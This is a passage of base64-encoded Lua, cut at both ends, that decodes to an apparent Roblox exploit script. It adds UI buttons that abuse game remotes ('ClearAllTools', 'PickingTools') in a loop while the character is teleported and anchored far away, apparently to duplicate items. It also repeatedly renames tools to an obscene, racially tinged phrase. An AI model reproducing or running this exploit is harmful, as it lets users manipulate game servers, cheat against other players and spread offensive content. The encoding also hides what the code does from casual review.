vcjMubmV3KDIwLCAwLCAzMCksIFZlY3RvcjMubmV3KDMwLCAwLCAzMCksIFZlY3RvcjMubmV3KDQwLCAwLCAzMCksIFZlY3RvcjMubmV3KDUwLCAwLCAzMCksCiAgICAgICAgICAgIFZlY3RvcjMubmV3KDYwLCAwLCAzMCksIFZlY3RvcjMubmV3KC0wLCAwLCAzMCksIFZlY3RvcjMubmV3KC0xMCwgMCwgMzApLCBWZWN0b3IzLm5ldygtMjAsIDAsIDMwKSwKICAgICAgICAgICAgVmVjdG9yMy5uZXcoLTMwLCAwLCAzMCksIFZlY3RvcjMubmV3KC00MCwgMCwgMzApLCBWZWN0b3IzLm5ldygtNTAsIDAsIDMwKSwgVmVjdG9yMy5uZXcoLTYwLCAwLCAzMCksCiAgICAgICAgICAgIFZlY3RvcjMubmV3KDAsIDAsIDQ1KSwgVmVjdG9yMy5uZXcoMTAsIDAsIDQ1KSwgVmVjdG9yMy5uZXcoMjAsIDAsIDQ1KSwgVmVjdG9yMy5uZXcoMzAsIDAsIDQ1KSwKICAgICAgICAgICAgVmVjdG9yMy5uZXcoNDAsIDAsIDQ1KSwgVmVjdG9yMy5uZXcoNTAsIDAsIDQ1KSwgVmVjdG9yMy5uZXcoNjAsIDAsIDQ1KSwgVmVjdG9yMy5uZXcoLTAsIDAsIDQ1KSwKICAgICAgICAgICAgVmVjdG9yMy5uZXcoLTEwLCAwLCA0NSksIFZlY3RvcjMubmV3KC0yMCwgMCwgNDUpLCBWZWN0b3IzLm5ldygtMzAsIDAsIDQ1KSwgVmVjdG9yMy5uZXcoLTQwLCAwLCA0NSksCiAgICAgICAgICAgIFZlY3RvcjMubmV3KC01MCwgMCwgNDUpLCBWZWN0b3IzLm5ldygtNjAsIDAsIDQ1KSwgVmVjdG9yMy5uZXcoMCwgMCwgMTUpLCBWZWN0b3IzLm5ldygxMCwgMCwgMTUpLAogICAgICAgICAgICBWZWN0b3IzLm5ldygyMCwgMCwgMTUpLCBWZWN0b3IzLm5ldygzMCwgMCwgMTUpLCBWZWN0b3IzLm5ldyg0MCwgMCwgMTUpLCBWZWN0b3IzLm5ldyg1MCwgMCwgMTUpLAogICAgICAgICAgICBWZWN0b3IzLm5ldyg2MCwgMCwgMTUpLCBWZWN0b3IzLm5ldygtMCwgMCwgMTUpLCBWZWN0b3IzLm5ldygtMTAsIDAsIDE1KSwgVmVjdG9yMy5uZXcoLTIwLCAwLCAxNSksCiAgICAgICAgICAgIFZlY3RvcjMubmV3KC0zMCwgMCwgMTUpLCBWZWN0b3IzLm5ldygtNDAsIDAsIDE1KSwgVmVjdG9yMy5uZXcoLTUwLCAwLCAxNSksIFZlY3RvcjMubmV3KC02MCwgMCwgMTUpLAogICAgICAgICAgICBWZWN0b3IzLm5ldygwLCAwLCAtMTUpLCBWZWN0b3IzLm5ldygxMCwgMCwgLTE1KSwgVmVjdG9yMy5uZXcoMjAsIDAsIC0xNSksIFZlY3RvcjMubmV3KDMwLCAwLCAtMTUpLAogICAgICAgICAgICBWZWN0b3IzLm5ldyg0MCwgMCwgLTE1KSwgVmVjdG9yMy5uZXcoNTAsIDAsIC0xNSksIFZlY3RvcjMubmV3KDYwLCAwLCAtMTUpLCBWZWN0b3IzLm5ldygtMCwgMCwgLTE1KSwKICAgICAgICAgICAgVmVjdG9yMy5uZXcoLTEwLCAwLCAtMTUpLCBWZWN0b3IzLm5ldygtMjAsIDAsIC0xNSksIFZlY3RvcjMubmV3KC0zMCwgMCwgLTE1KSwgVmVjdG9yMy5uZXcoLTQwLCAwLCAtMTUpLAogICAgICAgICAgICBWZWN0b3IzLm5ldygtNTAsIDAsIC0xNSksIFZlY3RvcjMubmV3KC02MCwgMCwgLTE1KSwgVmVjdG9yMy5uZXcoMCwgMCwgLTMwKSwgVmVjdG9yMy5uZXcoMTAsIDAsIC0zMCksCiAgICAgICAgICAgIFZlY3RvcjMubmV3KDIwLCAwLCAtMzApLCBWZWN0b3IzLm5ldygzMCwgMCwgLTMwKSwgVmVjdG9yMy5uZXcoNDAsIDAsIC0zMCksIFZlY3RvcjMubmV3KDUwLCAwLCAtMzApLAogICAgICAgICAgICBWZWN0b3IzLm5ldyg2MCwgMCwgLTMwKSwgVmVjdG9yMy5uZXcoLTAsIDAsIC0zMCksIFZlY3RvcjMubmV3KC0xMCwgMCwgLTMwKSwgVmVjdG9yMy5uZXcoLTIwLCAwLCAtMzApLAogICAgICAgICAgICBWZWN0b3IzLm5ldygtMzAsIDAsIC0zMCksIFZlY3RvcjMubmV3KC00MCwgMCwgLTMwKSwgVmVjdG9yMy5uZXcoLTUwLCAwLCAtMzApLCBWZWN0b3IzLm5ldygtNjAsIDAsIC0zMCksCiAgICAgICAgICAgIFZlY3RvcjMubmV3KDAsIDAsIC0zMCksIFZlY3RvcjMubmV3KDEwLCAwLCAtNDUpLCBWZWN0b3IzLm5ldygyMCwgMCwgLTQ1KSwgVmVjdG9yMy5uZXcoMzAsIDAsIC00NSksCiAgICAgICAgICAgIFZlY3RvcjMubmV3KDQwLCAwLCAtNDUpLCBWZWN0b3IzLm5ldyg1MCwgMCwgLTQ1KSwgVmVjdG9yMy5uZXcoNjAsIDAsIC00NSksIFZlY3RvcjMubmV3KC0wLCAwLCAtNDUpLAogICAgICAgICAgICBWZWN0b3IzLm5ldygtMTAsIDAsIC00NSksIFZlY3RvcjMubmV3KC0yMCwgMCwgLTQ1KSwgVmVjdG9yMy5uZXcoLTMwLCAwLCAtNDUpLCBWZWN0b3IzLm5ldygtNDAsIDAsIC00NSksCiAgICAgICAgICAgIFZlY3RvcjMubmV3KC01MCwgMCwgLTQ1KSwgVmVjdG9yMy5uZXcoLTYwLCAwLCAtNDUpLCBWZWN0b3IzLm5ldygxMCwgMCwgLTYwKSwgVmVjdG9yMy5uZXcoMjAsIDAsIC02MCksCiAgICAgICAgICAgIFZlY3RvcjMubmV3KDMwLCAwLCAtNjApLCBWZWN0b3IzLm5ldyg0MCwgMCwgLTYwKSwgVmVjdG9yMy5uZXcoNTAsIDAsIC02MCksIFZlY3RvcjMubmV3KDYwLCAwLCAtNjApLAogICAgICAgICAgICBWZWN0b3IzLm5ldygtMCwgMCwgLTYwKSwgVmVjdG9yMy5uZXcoLTEwLCAwLCAtNjApLCBWZWN0b3IzLm5ldygtMjAsIDAsIC02MCksIFZlY3RvcjMubmV3KC0zMCwgMCwgLTYwKSwKICAgICAgICAgICAgVmVjdG9yMy5uZXcoLTQwLCAwLCAtNjApLCBWZWN0b3IzLm5ldygtNTAsIDAsIC02MCksIFZlY3RvcjMubmV3KC02MCwgMCwgLTYwKSwgVmVjdG9yMy5uZXcoMTAsIDAsIC03NSksCiAgICAgICAgICAgIFZlY3RvcjMubmV3KDIwLCAwLCAtNzUpLCBWZWN0b3IzLm5ldygzMCwgMCwgLTc1KSwgVmVjdG9yMy5uZXcoNDAsIDAsIC03NSksIFZlY3RvcjMubmV3KDUwLCAwLCAtNzUpLAogICAgICAgICAgICBWZWN0b3IzLm5ldyg2MCwgMCwgLTc1KSwgVmVjdG9yMy5uZXcoLTAsIDAsIC03NSksIFZlY3RvcjMubmV3KC0xMCwgMCwgLTc1KSwgVmVjdG9yMy5uZXcoLTIwLCAwLCAtNzUpLAogICAgICAgICAgICBWZWN0b3IzLm5ldygtMzAsIDAsIC03NSksIFZlY3RvcjMubmV3KC00MCwgMCwgLTc1KSwgVmVjdG9yMy5uZXcoLTUwLCAwLCAtNzUpLCBWZWN0b3IzLm5ldygtNjAsIDAsIC03NSkKICAgICAgICB9CiAgICAgICAgZm9yIGksIHRvb2wgaW4gcGFpcnMoZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkJhY2twYWNrOkdldENoaWxkcmVuKCkpIGRvCiAgICAgICAgICAgIGlmIHRvb2w6SXNBKCJUb29sIikgdGhlbgogICAgICAgICAgICAgICAgdG9vbC5QYXJlbnQgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyCiAgICAgICAgICAgICAgICBsb2NhbCB2YXJfdGw1cXJoID0gbWF0aC5taW4oaSwgI0dyaXBQb3NUYWJsZSkKICAgICAgICAgICAgICAgIGxvY2FsIHZhcl9vZWZndjIgPSBHcmlwUG9zVGFibGVbZ3JpcFBvc0luZGV4XQogICAgICAgICAgICAgICAgaWYgdG9vbDpJc0Rlc2NlbmRhbnRPZihnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgdG9vbC5HcmlwUG9zID0gZ3JpcFBvcwogICAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgICAgIHdhcm4oIlRvb2wgIiwgdG9vbC5OYW1lLCAiIGlzIG5vdCBpbiB0aGUgY2hhcmFjdGVyLiIpCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICBlbmQKfSkKCi0tIFNlY3Rpb24gZm9yIFNwZWNpYWwgR3JpcApTZWN0aW9uID0gVG9vbHNUYWI6QWRkU2VjdGlvbih7CiAgICBOYW1lID0gIlNwZWNpYWwgR3JpcCIKfSkKCi0tIEJ1dHRvbiBmb3IgQmxhY2sgQmFyClRvb2xzVGFiOkFkZEJ1dHRvbih7CiAgICBOYW1lID0gIkJsYWNrIEJhciIsCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgICAgICAgICAgb2xkY2ZyYW1lID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0LkNGcmFtZQogICAgICAgICAgICAgICAgdG9vbHRoYXRpd2FudHRvZHVwZSA9ICJCb3giCiAgICAgICAgICAgICAgICB0b29scyA9ICJCb3giCiAgICAgICAgICAgICAgICBpZiBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkLlNpdCA9PSB0cnVlIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KCkKICAgICAgICAgICAgICAgICAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZC5TaXQgPSBmYWxzZQogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICB3YWl0KDAuMSkKICAgICAgICAgICAgICAgIGxvY2FsIHZhcl9memYxaHMgPSB7CiAgICAgICAgICAgICAgICAgICAgICAgIFsxXSA9ICJDbGVhckFsbFRvb2xzIgogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBjbGVhcnRvb2xyZW1vdGU6RmlyZVNlcnZlcih1bnBhY2soYXJncykpCiAgICAgICAgICAgICAgICBpZiBnYW1lOkdldFNlcnZpY2UoIldvcmtzcGFjZSIpOkZpbmRGaXJzdENoaWxkKCJDYW1lcmEiKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIGdhbWU6R2V0U2VydmljZSgiV29ya3NwYWNlIik6RmluZEZpcnN0Q2hpbGQoIkNhbWVyYSIpOkRlc3Ryb3koKSBlbmQKICAgICAgICAgICAgICAgIGZvciBtPTEsMiBkbyB0YXNrLndhaXQoKQogICAgICAgICAgICAgICAgICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQuQ0ZyYW1lID0gQ0ZyYW1lLm5ldyg5OTk5OTk5OTkuNDE0LCAtNDkwLCA5OTk5OTk5OTkuNDE0LCAwLjk3NDM2MDQwNiwgLTAuMTc1NzM0MDg4LCAwLjE0MDQ5NzYxLCAtMC4xMzM0NDE0MDQsIDAuMDUxNDA1MzA2OSwgMC45ODk3MjI3MjksIC0wLjE4MTE1MDMwMiwgLTAuOTgzMDk0NjkyLCAwLjAyNjYzNzA5MjIpCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoMC4yKQogICAgICAgICAgICAgICAgICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQuQW5jaG9yZWQgPSB0cnVlCiAgICAgICAgICAgICAgICB3YWl0KDAuMykKICAgICAgICAgICAgICAgIGR1cGluZyA9IHRydWUKICAgICAgICAgICAgICAgIGZvciBtPTEsIDc2IGRvCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIGR1cGluZyA9PSBmYWxzZSB0aGVuIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWRSb290UGFydC5BbmNob3JlZCA9IGZhbHNlIHJldHVybiBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgaWYgZ2FtZTpHZXRTZXJ2aWNlKCJXb3Jrc3BhY2UiKTpGaW5kRmlyc3RDaGlsZCgiQ2FtZXJhIikgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGdhbWU6R2V0U2VydmljZSgiV29ya3NwYWNlIik6RmluZEZpcnN0Q2hpbGQoIkNhbWVyYSIpOkRlc3Ryb3koKSBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgdmFyX3NwMzB5dyA9IHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBbMV0gPSAiUGlja2luZ1Rvb2xzIiwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBbMl0gPSB0b29sdGhhdGl3YW50dG9kdXBlCiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgIHBpY2t0b29scmVtb3RlOkludm9rZVNlcnZlcih1bnBhY2soYXJncykpCiAgICAgICAgICAgICAgICAgICAgICAgIGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpLkxvY2FsUGxheWVyLkJhY2twYWNrOldhaXRGb3JDaGlsZCh0b29sdGhhdGl3YW50dG9kdXBlKS5QYXJlbnQgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIGR1cGluZyA9PSBmYWxzZSB0aGVuIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWRSb290UGFydC5BbmNob3JlZCA9IGZhbHNlIHJldHVybiBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgd2FpdCgpCiAgICAgICAgICAgICAgICAgICAgICAgIGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpLkxvY2FsUGxheWVyLkNoYXJhY3Rlclt0b29sdGhhdGl3YW50dG9kdXBlXTpGaW5kRmlyc3RDaGlsZCgiSGFuZGxlIikuTmFtZSA9ICJI4iClYeIgpW7iIKVk4iClbOIgpWUiCiAgICAgICAgICAgICAgICAgICAgICAgIGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpLkxvY2FsUGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCh0b29sdGhhdGl3YW50dG9kdXBlKS5QYXJlbnQgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQmFja3BhY2sKICAgICAgICAgICAgICAgICAgICAgICAgZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikuTG9jYWxQbGF5ZXIuQmFja3BhY2s6RmluZEZpcnN0Q2hpbGQodG9vbHRoYXRpd2FudHRvZHVwZSkuUGFyZW50ID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlcgogICAgICAgICAgICAgICAgICAgICAgICByZXBlYXQgICAgICAgICAgICAgICAgIGlmIGdhbWU6R2V0U2VydmljZSgiV29ya3NwYWNlIik6RmluZEZpcnN0Q2hpbGQoIkNhbWVyYSIpIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBnYW1lOkdldFNlcnZpY2UoIldvcmtzcGFjZSIpOkZpbmRGaXJzdENoaWxkKCJDYW1lcmEiKTpEZXN0cm95KCkgZW5kIHdhaXQoKSB1bnRpbCBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKS5Mb2NhbFBsYXllci5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQodG9vbHRoYXRpd2FudHRvZHVwZSkgPT0gbmlsCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWRSb290UGFydC5BbmNob3JlZCA9IGZhbHNlCiAgICAgICAgICAgICAgICByZXBlYXQgd2FpdCgpIHVudGlsIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkUm9vdFBhcnQiKSA9PSBuaWwKICAgICAgICAgICAgICAgIHJlcGVhdCB3YWl0KCkgdW50aWwgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpCiAgICAgICAgICAgICAgICB0b29sZ3JpcCA9IHRydWUKICAgICAgICAgICAgICAgIGR1cGluZyA9IGZhbHNlCiAgICAgICAgICAgICAgICB3YWl0KDEpCiAgICAgICAgICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQmFja3BhY2tbdG9vbHNdLkdyaXAgPSBDRnJhbWUubmV3KC0wLjc4NDA4OTgwNCwgMC42MjM0NTI2NjMsIDAuOTI4NDc0NDI2LCAwLjYxMTYzMTYzMiwgMC4wMjAyODEyNDAzLCAtMC43OTA4ODI2NDcsIDAuMTA3ODY0MDk3LCAwLjk4ODE5ODg3NiwgMC4xMDg3NTgyMTEsIDAuNzgzNzU1MTI0LCAtMC4xNTE4Mjc4MTIsIDAuNjAyMjI2MDE5KSArIFZlY3RvcjMubmV3KDAsIC0xLjUsIDApCiAgICAgICAgICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQmFja3BhY2tbdG9vbHNdLk5hbWUgPSAiQmlnIEJsYWNrIERpY2sgTG1hbyIKICAgICAgICAgICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFja1t0b29sc10uR3JpcCA9IENGcmFtZS5uZXcoLTAuNzg0MDg5ODA0LCAwLjYyMzQ1MjY2MywgMC45Mjg0NzQ0MjYsIDAuNjExNjMxNjMyLCAwLjAyMDI4MTI0MDMsIC0wLjc5MDg4MjY0NywgMC4xMDc4NjQwOTcsIDAuOTg4MTk4ODc2LCAwLjEwODc1ODIxMSwgMC43ODM3NTUxMjQsIC0wLjE1MTgyNzgxMiwgMC42MDIyMjYwMTkpICsgVmVjdG9yMy5uZXcoMCwgMCwgMikKICAgICAgICAgICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFja1t0b29sc10uTmFtZSA9ICJCaWcgQmxhY2sgRGljayBMbWFvIgogICAgICAgICAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkJhY2twYWNrW3Rvb2xzXS5HcmlwID0gQ0ZyYW1lLm5ldygtMC43ODQwODk4MDQsIDAuNjIzNDUyNjYzLCAwLjkyODQ3NDQyNiwgMC42MTE2MzE2MzIsIDAuMDIwMjgxMjQwMywgLTAuNzkwODgyNjQ3LCAwLjEwNzg2NDA5NywgMC45ODgxOTg4NzYsIDAuMTA4NzU4MjExLCAwLjc4Mzc1NTEyNCwgLTAuMTUxODI3ODEyLCAwLjYwMjIyNjAxOSkgKyBWZWN0b3IzLm5ldygwLCAwLCA0KQogICAgICAgICAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkJhY2twYWNrW3Rvb2xzXS5OYW1lID0gIkJpZyBCbGFjayBEaWNrIExtYW8iCiAgICAgICAgICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQmFja3BhY2tbdG9vbHNdLkdyaXAgPSBDRnJhbWUubmV3KC0wLjc4NDA4OTgwNCwgMC42MjM0NTI2NjMsIDAuOTI4NDc0NDI2LCAwLjYxMTYzMTYzMiwgMC4wMjAyODEyNDAzLCAtMC43OTA4ODI2NDcsIDAuMTA3ODY0MDk3LCAwLjk4ODE5ODg3NiwgMC4xMDg3NTgyMTEsIDAuNzgzNzU1MTI0LCAtMC4xNTE4Mjc4MTIsIDAuNjAyMjI2MDE5KSArIFZlY3RvcjMubmV3KDAsIDAsIDYpCiAgICAgICAgICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQmFja3BhY2tbdG9vbHNdLk5hbWUgPSAiQmlnIEJsYWNrIERpY2sgTG1hbyIKICAgICAgICAgICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFja1t0b29sc10uR3JpcCA9IENGcmFtZS5uZXcoLTAuNzg0MDg5ODA0LCAwLjYyMzQ1MjY2MywgMC45Mjg0NzQ0MjYsIDAuNjExNjMxNjMyLCAwLjAyMDI4MTI0MDMsIC0wLjc5MDg4MjY0NywgMC4xMDc4NjQwOTcsIDAuOTg4MTk4ODc2LCAwLjEwODc1ODIxMSwgMC43ODM3NTUxMjQsIC0wLjE1MTgyNzgxMiwgMC42MDIyMjYwMTkpICsgVmVjdG9yMy5uZXcoMCwgMCwgOCkKICAgICAgICAgICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFja1t0b29sc10uTmFtZSA9ICJCaWcgQmxhY2sgRGljayBMbWFvIgogICAgICAgICAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkJhY2twYWNrW3Rvb2xzXS5HcmlwID0gQ0ZyYW1lLm5ldygtMC43ODQwODk4MDQsIDAuNjIzNDUyNjYzLCAwLjkyODQ3NDQyNiwgMC42MTE2MzE2MzIsIDAuMDIwMjgxMjQwMywgLTAuNzkwODgyNjQ3LCAwLjEwNzg2NDA5NywgMC45ODgxOTg4NzYsIDAuMTA4NzU4MjExLCAwLjc4Mzc1NTEyNCwgLTAuMTUxODI3ODEyLCAwLjYwMjIyNjAxOSkgKyBWZWN0b3IzLm5ldygwLCAwLCAtOCkKICAgICAgICAgICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFja1t0b29sc10uTmFtZSA9ICJCaWcgQmxhY2sgRGljayBMbWFvIgogICAgICAgICAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkJhY2twYWNrW3Rvb2xzXS5HcmlwID0gQ0ZyYW1lLm5ldygtMC43ODQwODk4MDQsIDAuNjIzNDUyNjYzLCAwLjkyODQ3NDQyNiwgMC42MTE2MzE2MzIsIDAuMDIwMjgxMjQwMywgLTAuNzkwODgyNjQ3LCAwLjEwNzg2NDA5NywgMC45ODgxOTg4NzYsIDAuMTA4NzU4MjExLCAwLjc4Mzc1NTEyNCwgLTAuMTUxODI3ODEyLCAwLjYwMjIyNjAxOSkgKyBWZWN0b3IzLm5ldygwLCAwLCAtNikKICAgICAgICAgICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFja1t0b29sc10uTmFtZSA9ICJCaWcgQmxhY2sgRGljayBMbWFvIgogICAgICAgICAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkJhY2twYWNrW3Rvb2xzXS5HcmlwID0gQ0ZyYW1lLm5ldygtMC43ODQwODk4MDQsIDAuNjIzNDUyNjYzLCAwLjkyODQ3NDQyNiwgMC42MTE2MzE2MzIsIDAuMDIwMjgxMjQwMywgLTAuNzkwODgyNjQ3LCAwLjEwNzg2NDA5NywgMC45ODgxOTg4NzYsIDAuMTA4NzU4MjExLCAwLjc4Mzc1NTEyNCwgLTAuMTUxODI3ODEyLCAwLjYwMjIyNjAxOSkgKyBWZWN0b3IzLm5ldygwLCAwLCAtNCkKICAgICAgICAgICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFja1t0b29sc10uTmFtZSA9ICJCaWcgQmxhY2sgRGljayBMbWFvIgogICAgICAgICAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkJhY2twYWNrW3Rvb2xzXS5HcmlwID0gQ0ZyYW1lLm5ldygtMC43ODQwODk4MDQsIDAuNjIzNDUyNjYzLCAwLjkyODQ3NDQyNiwgMC42MTE2MzE2MzIsIDAuMDIwMjgxMjQwMywgLTAuNzkwODgyNjQ3LCAwLjEwNzg2NDA5NywgMC45ODgxOTg4NzYsIDAuMTA4NzU4MjExLCAwLjc4Mzc1NTEyNCwgLTAuMTUxODI3ODEyLCAwLjYwMjIyNjAxOSkgKyBWZWN0b3IzLm5ldygwLCAwLCAtMikKICAgICAgICAgICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFja1t0b29sc10uTmFtZSA9ICJCaWcgQmxhY2sgRGljayBMbWFvIgogICAgICAgICAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkJhY2twYWNrW3Rvb2xzXS5HcmlwID0gQ0ZyYW1lLm5ldygtMC43ODQwODk4MDQsIDAuNjIzNDUyNjYzLCAwLjkyODQ3NDQyNiwgMC42MTE2MzE2MzIsIDAuMDIwMjgxMjQwMywgLTAuNzkwODgyNjQ3LCAwLjEwNzg2NDA5NywgMC45ODgxOTg4NzYsIDAuMTA4NzU4MjExLCAwLjc4Mzc1NTEyNCwgLTAuMTUxODI3ODEyLCAwLjYwMjIyNjAxOSkgKyBWZWN0b3IzLm5ldygwLCAtMSwgLTEwKQogICAgICAgICAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkJhY2twYWNrW3Rvb2xzXS5OYW1lID0gIkJpZyBCbGFjayBEaWNrIExtYW8iCiAgICAgICAgICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQmFja3BhY2tbdG9vbHNdLkdyaXAgPSBDRnJhbWUubmV3KC0wLjc4NDA4OTgwNCwgMC42MjM0NTI2NjMsIDAuOTI4NDc0NDI2LCAwLjYxMTYzMTYzMiwgMC4wMjAyODEyNDAzLCAtMC43OTA4ODI2NDcsIDAuMTA3ODY0MDk3LCAwLjk4ODE5ODg3NiwgMC4xMDg3NTgyMTEsIDAuNzgzNzU1MTI0LCAtMC4xNTE4Mjc4MTIsIDAuNjAyMjI2MDE5KSArIFZlY3RvcjMubmV3KDAsIC0yLCAtMTApCiAgICAgICAgICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQmFja3BhY2tbdG9vbHNdLk5hbWUgPSAiQmlnIEJsYWNrIERpY2sgTG1hbyIKICAgICAgICAgICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFja1t0b29sc10uR3JpcCA9IENGcmFtZS5uZXcoLTAuNzg0MDg5ODA0LCAwLjYyMzQ1MjY2MywgMC45Mjg0NzQ0MjYsIDAuNjExNjMxNjMyLCAwLjAyMDI4MTI0MDMsIC0wLjc5MDg4MjY0NywgMC4xMDc4NjQwOTcsIDAuOTg4MTk4ODc2LCAwLjEwODc1ODIxMSwgMC43ODM3NTUxMjQsIC0wLjE1MTgyNzgxMiwgMC42MDIyMjYwMTkpICsgVmVjdG9yMy5uZXcoMCwgLTMsIC0xMCkKICAgICAgICAgICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFja1t0b29sc10uTmFtZSA9ICJCaWcgQmxhY2sgRGljayBMbWFvIgogICAgICAgICAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkJhY2twYWNrW3Rvb2xzXS5HcmlwID0gQ0ZyYW1lLm5ldygtMC43ODQwODk4MDQsIDAuNjIzNDUyNjYzLCAwLjkyODQ3NDQyNiwgMC42MTE2MzE2MzIsIDAuMDIwMjgxMjQwMywgLTAuNzkwODgyNjQ3LCAwLjEwNzg2NDA5NywgMC45ODgxOTg4NzYsIDAuMTA4NzU4MjExLCAwLjc4Mzc1NTEyNCwgLTAuMTUxODI3ODEyLCAwLjYwMjIyNjAxOSkgKyBWZWN0b3IzLm5ldygwLCAtNCwgLTEwKQogICAgICAgICAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkJhY2twYWNrW3Rvb2xzXS5OYW1lID0gIkJpZyBCbGFjayBEaWNrIExtYW8iCiAgICAgICAgICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQmFja3BhY2tbdG9vbHNdLkdyaXAgPSBDRnJhbWUubmV3KC0wLjc4NDA4OTgwNCwgMC42MjM0NTI2NjMsIDAuOTI4NDc0NDI2LCAwLjYxMTYzMTYzMiwgMC4wMjAyODEyNDAzLCAtMC43OTA4ODI2NDcsIDAuMTA3ODY0MDk3LCAwLjk4ODE5ODg3NiwgMC4xMDg3NTgyMTEsIDAuNzgzNzU1MTI0LCAtMC4xNTE4Mjc4MTIsIDAuNjAyMjI2MDE5KSArIFZlY3RvcjMubmV3KDAsIC01LCAtMTApCiAgICAgICAgICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQmFja3BhY2tbdG9vbHNdLk5hbWUgPSAiQmlnIEJsYWNrIERpY2sgTG1hbyIKICAgICAgICAgICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFja1t0b29sc10uR